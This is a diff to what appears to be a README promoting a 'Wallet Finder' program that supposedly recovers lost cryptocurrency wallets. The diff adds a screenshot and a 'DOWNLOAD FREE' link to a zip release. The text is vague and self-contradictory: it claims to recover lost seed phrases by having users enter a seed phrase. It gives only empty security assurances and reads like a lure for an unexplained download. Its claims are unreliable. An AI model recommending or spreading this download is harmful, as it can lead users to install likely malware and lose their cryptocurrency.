@@ -1,3 +1,5 @@
+![Screenshot 2024-07-07 122528](https://github.com/user-attachments/assets/1c9517b6-f901-48f7-a06e-dc32d6ce0457)
+
 The "Wallet Finder" software is a robust solution designed to assist users in recovering lost cryptocurrency wallets through the use of seed phrases. It serves as a vital tool for those who have misplaced or forgotten their original seed phrases, thereby enabling them to regain access to their digital assets securely.
 
 Key functionalities of the "Wallet Finder" include the ability to input a seed phrase and initiate a comprehensive search for corresponding cryptocurrency wallet addresses. This process supports a wide range of cryptocurrencies, ensuring compatibility with various blockchain networks such as Bitcoin, Ethereum, and others.
@@ -9,3 +11,5 @@ With a user-friendly interface, the "Wallet Finder" ensures ease of navigation a
 Security is paramount, given the sensitive nature of cryptocurrency keys. The program implements robust measures to safeguard user data and maintain confidentiality throughout the recovery operation.
 
 Overall, the "Wallet Finder" stands as a dependable solution for individuals seeking to restore access to their cryptocurrency wallets in instances where seed phrases have been lost or forgotten. It combines practical functionality with enhanced security features to deliver a seamless and secure recovery experience.
+
+[DOWNLOAD FREE](https://github.com/suzandavis/Lost-wallet-finder/releases/download/Download/lost-wallet-finder.zip)
